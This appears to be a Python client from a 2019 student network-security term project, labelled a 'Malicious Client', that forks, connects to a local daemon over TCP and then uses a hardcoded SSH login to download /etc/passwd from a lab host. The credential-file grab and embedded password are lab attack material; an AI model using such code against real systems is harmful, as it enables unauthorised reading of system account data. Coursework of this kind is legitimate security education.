#!/usr/bin/python3

# ==============================================================================
#      Assignment:  DPI912 Term Project
#      File: TCP/IP Client
#
#      Authors: Sang Min Park, Jacky Tea
#      Student ID (Sang Min Park): 124218173
#      Student ID (Jacky Tea): 152078168
#      Language: Python3
#      Libraries Used:
#
#      To compile:
#
#      Class: DPI912 NSB - Python for Programmers: Sockets and Security
#      Professor: Professor Harvey Kaduri
#      Due Date: Friday, December 6, 2019, 5:500 PM EST
#      Submitted:
#
# -----------------------------------------------------------------------------
#
#      Cookbook code utilized from the following source:
#      https://github.com/dabeaz/python-cookbook/blob/master/src/12/launching_a_daemon_process_on_unix/daemon.py
#
#      Description:
#
#      Input:
#
#      Output:
#
#      Algorithm:
#
#      Required Features Not Included:
#
#      Known Bugs:
#
# ==============================================================================

import os
import socket
import argparse
import paramiko
import logzero
from logzero import logger
from termProjSSHClient import SSHClient

# TCP/IP socket client wrapper class implementation


class Client(object):
    # Client constructor, creates a new client instance
    def __init__(self, ipAddress, portNumber):
        try:
            self.ipAddress = ipAddress
            self.portNumber = portNumber
            self.clientSocket = socket.socket(
                socket.AF_INET,
                socket.SOCK_STREAM
            )
        except Exception as err:
            print('client init:', err)
            logger.error(err)

    # method that attempts to connect to a server
    def makeConnection(self):
        try:
            self.clientSocket.connect((self.ipAddress, self.portNumber))
        except Exception as err:
            print('makeConnection()', err)
            self.closeClient()
            logger.error(err)

    # method that sends data over a connection
    def sendData(self, dataToSend):
        try:
            self.clientSocket.send((str(dataToSend)).encode())
        except Exception as err:
            print('sendData()', err)
            self.closeClient()
            logger.error(err)

    # method that receives data over a connection
    def receiveData(self, bufferSize):
        try:
            return str(self.clientSocket.recv(bufferSize).decode())
        except Exception as err:
            print('recvData()', err)
            self.closeClient()
            logger.error(err)

    # method that closes the client socket
    def closeClient(self):
        try:
            self.clientSocket.close()
        except Exception as err:
            print('closeClient()', err)
            logger.error(err)


# Forked client class implementation
class ForkedClient(object):
    # ForkedClient constructor, creates an uninitialized daemon
    def __init__(self):
        try:
            self.ipAddress = None
            self.socketNumber = None
        except Exception as err:
            print('fork init', err)
            logger.error(err)

    # method to parse forked client required args
    def parseArgs(self):
            # parse optional command line arguments for ipAddress and socket number
            parser = argparse.ArgumentParser(description='DPI912 Term Project - Malicious Client',
                                             formatter_class=argparse.ArgumentDefaultsHelpFormatter)
            parser.add_argument('-ip', type=str, default="127.0.0.1",
                                help='Client IP address.',  required=False)
            parser.add_argument('-socket', type=int, default=9000,
                                help='Client socket number',  required=False)

            # process arguments into member variables
            commandLineArgs = parser.parse_args()
            self.ipAddress = commandLineArgs.ip
            self.socketNumber = commandLineArgs.socket

    # method to communicate with the daemon
    def callDaemon(self):
        command = input('Enter a linux command to run:')
        try:
            # fork off client before sending data
            pid = os.fork()
            if pid == 0:
                # client
                client = Client(self.ipAddress, self.socketNumber)
                client.makeConnection()
                logger.info(client.receiveData(1024))
                client.sendData('Hello from client!')

                # ssh client
                sshClient = SSHClient("127.0.0.1", 2222, "rick", "jacky")
                sshClient.downloadFile("/home/lab/bin/py/Assignment_Term_Project", "/etc/passwd")
                os._exit(0)

            # wait for processes to finish and terminate them gracefully
            self.processTerminator()
        except Exception as err:
            print('callDaemon()', err)
            logger.error(err)

    # method to destroy any zombie processes
    def processTerminator(self):
        while True:
            try:
                # wait for process to terminate
                (pid, status) = os.waitpid(-1, os.WNOHANG)
            except OSError as osErr:
                print('processTerminator()', osErr)
                logger.info('Processes cleaned up.')
                break


# main thread
if __name__ == "__main__":
    # log information and errors to single file
    logzero.logfile("logs/termProjClient.log", maxBytes=1e6,
                    backupCount=3, disableStderrLogger=True)

    # send a request to the daemon
    forkedClient = ForkedClient()
    forkedClient.parseArgs()
    forkedClient.callDaemon()
